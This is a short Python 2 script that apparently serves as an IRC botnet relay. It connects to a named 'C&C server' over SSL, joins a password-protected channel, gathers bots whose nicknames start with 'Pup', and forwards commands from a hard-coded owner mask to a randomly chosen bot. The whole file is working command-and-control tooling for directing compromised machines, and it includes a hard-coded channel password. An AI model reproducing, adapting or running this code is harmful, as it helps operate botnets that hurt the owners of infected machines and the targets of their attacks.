#!/usr/bin/python
# -*- coding: utf-8 -*-

import re, signal, sys
from random import choice
from connection import *

nick      = "Racoon"
channel   = "#Tanuki"
password  = "ohlookyouknowthepassword"
usessl    = True
pups      = []
owner     = "nobody@blackcatz-jk9.aoi.0gvrju.IP"

def signal_handler( signal, frame ):
    """ Gracefully exit on SIGINT """
    print "\n[+] Quitting"
    sys.exit( 0 )

print "[+] Connecting to C&C server"
racoon = Connection( "irc.blackcatz.org", 6697, usessl )
racoon.ident( nick, nick, nick )
print "[+] Identified"
racoon.set_nick( nick )

while 1:

    signal.signal( signal.SIGINT, signal_handler )
    text  = racoon.recv( 4096 )
    
    if "PRIVMSG #Tanuki :{}:".format( nick ) in text:
        """ relay command to random bot """
        if owner in text:
            msg = ":".join( [ x for x in text.split( ":" )[3:] ] ).lstrip()
            elem = choice( pups )
            for i in pups:
                if elem in i:
                    racoon.msg_channel( channel, "{}: {}".format( elem, msg ) )

    if text.find( "396" ) != -1:
        """ join after opcode """
        print "[+] Joining C&C channel"
        racoon.join_channel( channel, password )

    """ rally pups """
    racoon.get_names( channel )
    if text.find( "353" ) != -1:
        for name in text.split( ":" )[2].split( " " ):
            if name.startswith( "Pup" ):
                if name not in pups:
                    pups.append( name )
                    print "[+] Added {}".format( name )
                    racoon.msg_channel( channel, "{}: こんにちは".format( name ) )

    if "QUIT" in text:
        for pup in pups:
            if pup in text:
                """ remove pup from litter """
                pups.remove( pup )
                racoon.msg_channel( channel, "\033[1;31mさようなら :(\033m[0m" )
                print "[!] Lost {}".format( pup )

    if text.find( "PING" ) != -1:
	"""kinda need this"""
        racoon.ping( text.split()[1]+"\r\n" )
        print "[+] Sent a ping"
